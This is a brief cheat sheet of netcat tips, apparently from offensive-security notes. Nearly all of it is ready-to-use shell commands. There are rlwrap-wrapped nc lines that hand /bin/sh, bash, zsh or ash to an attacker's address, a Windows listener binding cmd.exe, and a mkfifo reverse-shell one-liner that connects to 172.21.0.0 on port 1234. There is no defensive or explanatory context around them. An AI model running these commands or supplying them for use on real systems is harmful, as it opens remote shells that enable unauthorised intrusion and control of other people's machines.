# Netcat Tips

## rlwrap

We can use rlwrap to enable better movement in an nc shell:

Linux:

* rlwrap nc \[Your IP Address\] -e /bin/sh
* rlwrap nc \[Your IP Address\] -e /bin/bash
* rlwrap nc \[Your IP Address\] -e /bin/zsh
* rlwrap nc \[Your IP Address\] -e /bin/ash

Windows:

* rlwrap nc -lv \[localport\] -e cmd.exe

Linux netcat reverse shell:

* rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 172.21.0.0 1234 &gt;/tmp/f

